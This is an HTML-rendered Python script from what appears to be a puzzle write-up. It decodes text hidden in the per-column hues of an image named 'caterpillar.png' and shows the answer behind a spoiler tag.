-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> colorsys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;caterpillar.png&#x27;</span>).convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">w, h = img.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐列取最常见的非白色 Hue</span></span><br><span class="line">x_hues = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    hues = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r, g, b, a = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> (r, g, b) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        h_val, _, _ = colorsys.rgb_to_hsv(r/<span class="number">255</span>, g/<span class="number">255</span>, b/<span class="number">255</span>)</span><br><span class="line">        hues.append(<span class="built_in">round</span>(h_val * <span class="number">360</span>))</span><br><span class="line">    <span class="keyword">if</span> hues:</span><br><span class="line">        x_hues[x] = Counter(hues).most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并连续相同 Hue 为段，只保留稳定段（&gt;=10 列宽）</span></span><br><span class="line">result = []</span><br><span class="line">run_h, run_start, run_len = <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    h = x_hues.get(x)</span><br><span class="line">    <span class="keyword">if</span> h == run_h:</span><br><span class="line">        run_len += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> run_len &gt;= <span class="number">10</span> <span class="keyword">and</span> <span class="number">32</span> &lt;= run_h &lt;= <span class="number">126</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>(run_h))</span><br><span class="line">        run_h, run_start, run_len = h, x, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> run_len &gt;= <span class="number">10</span> <span class="keyword">and</span> <span class="number">32</span> &lt;= run_h &lt;= <span class="number">126</span>:</span><br><span class="line">    result.append(<span class="built_in">chr</span>(run_h))</span><br><span class="line"></span><br><span class="line">decoded = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Decoded Hue sequence: <span class="subst">&#123;decoded&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Answer (last word):   <span class="subst">&#123;decoded.split()[-<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">COLOR-SHEMES</span></span>
 
       
     </div>
